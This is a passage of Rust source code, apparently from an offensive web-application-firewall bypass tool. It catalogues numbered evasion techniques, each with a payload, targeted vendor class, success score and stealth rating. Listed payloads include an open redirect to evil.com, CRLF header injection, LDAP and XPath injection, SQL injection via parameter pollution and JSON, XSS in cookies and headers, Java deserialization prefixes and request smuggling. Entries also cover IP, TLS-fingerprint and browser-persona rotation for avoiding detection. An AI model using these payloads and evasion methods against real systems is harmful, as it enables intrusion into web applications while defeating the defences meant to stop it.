        technique!(74, "URL Encoded Redirect", "URL encode the redirect target", vec![PayloadType::OpenRedirect], EvasionEncoding::UrlEncoding, cloud_vendors.clone(), 0.60, StealthLevel::Moderate, "//%65%76%69%6c%2e%63%6f%6d", vec![73], &["redirect", "url", "encoding"]),
        technique!(75, "CRLF Redirect", "CRLF injection to set Location header", vec![PayloadType::OpenRedirect, PayloadType::Crlf], EvasionEncoding::UrlEncoding, sig_vendors.clone(), 0.55, StealthLevel::Stealthy, "%0d%0aLocation: http://evil.com", vec![69, 73], &["redirect", "crlf", "header"]),
        technique!(76, "Protocol-relative Redirect", "Protocol-relative URL bypass", vec![PayloadType::OpenRedirect], EvasionEncoding::None, sig_vendors.clone(), 0.62, StealthLevel::Moderate, "//evil.com", vec![73, 74], &["redirect", "protocol", "relative"]),

        // === LDAP/XPATH (77-82) ===
        technique!(77, "LDAP Wildcard", "LDAP wildcard injection", vec![PayloadType::Ldap], EvasionEncoding::None, sig_vendors.clone(), 0.55, StealthLevel::Moderate, "*)(|(uid=*))", vec![78], &["ldap", "wildcard", "injection"]),
        technique!(78, "URL Encoded LDAP", "URL encode LDAP special chars", vec![PayloadType::Ldap], EvasionEncoding::UrlEncoding, cloud_vendors.clone(), 0.58, StealthLevel::Stealthy, "%2a%29%28%7c%28uid%3d%2a%29%29", vec![77], &["ldap", "url", "encoding"]),
        technique!(79, "XPath Comment", "XPath injection with comment bypass", vec![PayloadType::Xpath], EvasionEncoding::None, sig_vendors.clone(), 0.52, StealthLevel::Moderate, "' or 1=1 or ''='", vec![80], &["xpath", "comment", "injection"]),
        technique!(80, "XPath String Concat", "XPath concat() to build strings", vec![PayloadType::Xpath], EvasionEncoding::None, sig_vendors.clone(), 0.50, StealthLevel::Stealthy, "concat('adm','in')", vec![79], &["xpath", "concat", "function"]),

        // === DESERIALIZATION (81-85) ===
        technique!(81, "Base64 Deser Payload", "Base64 encode serialized object", vec![PayloadType::Deserialization], EvasionEncoding::Base64, all_vendors.clone(), 0.55, StealthLevel::Ghost, "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", vec![82], &["deser", "base64", "java"]),
        technique!(82, "Hex Deser Payload", "Hex encode deserialization payload", vec![PayloadType::Deserialization], EvasionEncoding::HexEncoding, sig_vendors.clone(), 0.50, StealthLevel::Ghost, "aced0005737200", vec![81], &["deser", "hex", "encoding"]),
        technique!(83, "Chunked Deser", "Send deserialization payload via chunked TE", vec![PayloadType::Deserialization], EvasionEncoding::ChunkedTransfer, cloud_vendors.clone(), 0.58, StealthLevel::Ghost, "Transfer-Encoding: chunked\r\n...", vec![81, 82], &["deser", "chunked", "transfer"]),

        // === GENERIC / TRANSPORT TECHNIQUES (84-105) ===
        technique!(84, "Chunked Transfer Encoding", "Split payload across HTTP chunks", vec![PayloadType::Xss, PayloadType::Sqli], EvasionEncoding::ChunkedTransfer, cloud_vendors.clone(), 0.72, StealthLevel::Stealthy, "Transfer-Encoding: chunked", vec![1, 21, 85], &["transport", "chunked", "split"]),
        technique!(85, "Multipart Boundary", "Hide payload in multipart form boundary", vec![PayloadType::Xss, PayloadType::Sqli], EvasionEncoding::Multipart, cloud_vendors.clone(), 0.68, StealthLevel::Stealthy, "Content-Type: multipart/form-data; boundary=evil", vec![84, 1, 21], &["transport", "multipart", "boundary"]),
        technique!(86, "HTTP/2 Desync", "HTTP/2 request smuggling", vec![PayloadType::Xss, PayloadType::Sqli], EvasionEncoding::None, cloud_vendors.clone(), 0.45, StealthLevel::Ghost, "PRI * HTTP/2.0 + smuggled request", vec![84], &["transport", "h2", "desync"]),
        technique!(87, "Content-Type Mismatch", "Send JSON body with form Content-Type", vec![PayloadType::Sqli, PayloadType::Xss], EvasionEncoding::None, sig_vendors.clone(), 0.55, StealthLevel::Moderate, "Content-Type: application/x-www-form-urlencoded (body is JSON)", vec![84, 85], &["transport", "content-type", "mismatch"]),
        technique!(88, "HTTP Parameter Pollution", "Duplicate parameters to confuse parsers", vec![PayloadType::Sqli, PayloadType::Xss], EvasionEncoding::None, all_vendors.clone(), 0.60, StealthLevel::Moderate, "?id=1&id=UNION+SELECT+1,2", vec![21, 1], &["transport", "hpp", "duplicate"]),
        technique!(89, "Header Injection", "Inject payload via custom headers", vec![PayloadType::Xss, PayloadType::Sqli], EvasionEncoding::None, sig_vendors.clone(), 0.50, StealthLevel::Stealthy, "X-Custom: <script>alert(1)</script>", vec![1, 21], &["transport", "header", "injection"]),
        technique!(90, "HTTP Method Override", "Override HTTP method via headers", vec![PayloadType::Xss, PayloadType::Sqli], EvasionEncoding::None, sig_vendors.clone(), 0.48, StealthLevel::Moderate, "X-HTTP-Method-Override: PUT", vec![89], &["transport", "method", "override"]),
        technique!(91, "Fragmented URL", "Fragment URL path to bypass path-based rules", vec![PayloadType::PathTraversal, PayloadType::Xss], EvasionEncoding::None, sig_vendors.clone(), 0.52, StealthLevel::Moderate, "/api/./v1/../admin/users", vec![46, 52], &["transport", "fragment", "path"]),
        technique!(92, "HTTP/0.9 Downgrade", "Downgrade to HTTP/0.9 to avoid modern WAF parsing", vec![PayloadType::Xss, PayloadType::Sqli], EvasionEncoding::None, sig_vendors.clone(), 0.40, StealthLevel::Loud, "GET /page?q=<script>alert(1)</script>", vec![1], &["transport", "http09", "downgrade"]),
        technique!(93, "Request Line Injection", "Inject payload into request line", vec![PayloadType::Xss], EvasionEncoding::None, sig_vendors.clone(), 0.42, StealthLevel::Loud, "GET /page HTTP/1.1\\r\\nEvil: header", vec![89, 69], &["transport", "request-line", "injection"]),
        technique!(94, "Cookie Injection Payload", "Place payload in cookie value", vec![PayloadType::Xss, PayloadType::Sqli], EvasionEncoding::None, sig_vendors.clone(), 0.55, StealthLevel::Stealthy, "Cookie: session=<script>alert(1)</script>", vec![1, 89], &["transport", "cookie", "injection"]),
        technique!(95, "Referer Injection", "Place payload in Referer header", vec![PayloadType::Xss, PayloadType::Sqli], EvasionEncoding::None, sig_vendors.clone(), 0.52, StealthLevel::Stealthy, "Referer: http://evil.com/<script>alert(1)</script>", vec![89, 94], &["transport", "referer", "injection"]),
        technique!(96, "User-Agent Injection", "Payload in User-Agent header", vec![PayloadType::Xss, PayloadType::Sqli], EvasionEncoding::None, sig_vendors.clone(), 0.50, StealthLevel::Moderate, "User-Agent: <script>alert(1)</script>", vec![89], &["transport", "user-agent", "injection"]),
        technique!(97, "JSON Injection", "SQL/XSS injection through JSON values", vec![PayloadType::Sqli, PayloadType::Xss], EvasionEncoding::None, cloud_vendors.clone(), 0.58, StealthLevel::Moderate, "{\"name\":\"' OR 1=1--\"}", vec![21, 1], &["transport", "json", "injection"]),
        technique!(98, "XML Wrapper Injection", "Wrap payload in XML CDATA", vec![PayloadType::Xss, PayloadType::Sqli], EvasionEncoding::None, sig_vendors.clone(), 0.52, StealthLevel::Stealthy, "<![CDATA[<script>alert(1)</script>]]>", vec![1, 65], &["transport", "xml", "cdata"]),
        technique!(99, "Char Concat Chain", "Character-by-character concatenation", vec![PayloadType::Sqli, PayloadType::Xss], EvasionEncoding::CharSubstitution, ml_vendors.clone(), 0.48, StealthLevel::Ghost, "CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)", vec![31, 25], &["generic", "char", "concat"]),
        technique!(100, "Comment Wrapped Payload", "Wrap entire payload in multi-layer comments", vec![PayloadType::Sqli, PayloadType::Xss], EvasionEncoding::CommentInsertion, sig_vendors.clone(), 0.55, StealthLevel::Moderate, "/*!50000 SELECT*/ * FROM users", vec![21, 22], &["generic", "comment", "version"]),
        technique!(101, "Polyglot Payload", "Single payload valid as multiple injection types", vec![PayloadType::Xss, PayloadType::Sqli], EvasionEncoding::None, all_vendors.clone(), 0.45, StealthLevel::Moderate, "'-alert(1)-'", vec![1, 21], &["generic", "polyglot", "multi"]),
        technique!(102, "Timing Jitter Evasion", "Random timing delays between requests", vec![PayloadType::Sqli, PayloadType::Xss, PayloadType::CommandInjection], EvasionEncoding::None, ml_vendors.clone(), 0.65, StealthLevel::Ghost, "(timing based, not payload)", vec![], &["generic", "timing", "jitter"]),
        technique!(103, "IP Rotation Evasion", "Rotate source IP across requests", vec![PayloadType::Sqli, PayloadType::Xss, PayloadType::CommandInjection], EvasionEncoding::None, all_vendors.clone(), 0.70, StealthLevel::Ghost, "(network based, not payload)", vec![102], &["generic", "ip", "rotation"]),
        technique!(104, "TLS Fingerprint Rotation", "Rotate TLS fingerprint (JA3) per request", vec![PayloadType::Sqli, PayloadType::Xss], EvasionEncoding::None, ml_vendors.clone(), 0.60, StealthLevel::Ghost, "(TLS based, not payload)", vec![102, 103], &["generic", "tls", "fingerprint"]),
        technique!(105, "Persona Rotation", "Rotate full browser persona per session", vec![PayloadType::Sqli, PayloadType::Xss, PayloadType::CommandInjection], EvasionEncoding::None, ml_vendors.clone(), 0.62, StealthLevel::Ghost, "(persona based, not payload)", vec![102, 103, 104], &["generic", "persona", "rotation"]),
    ]
}
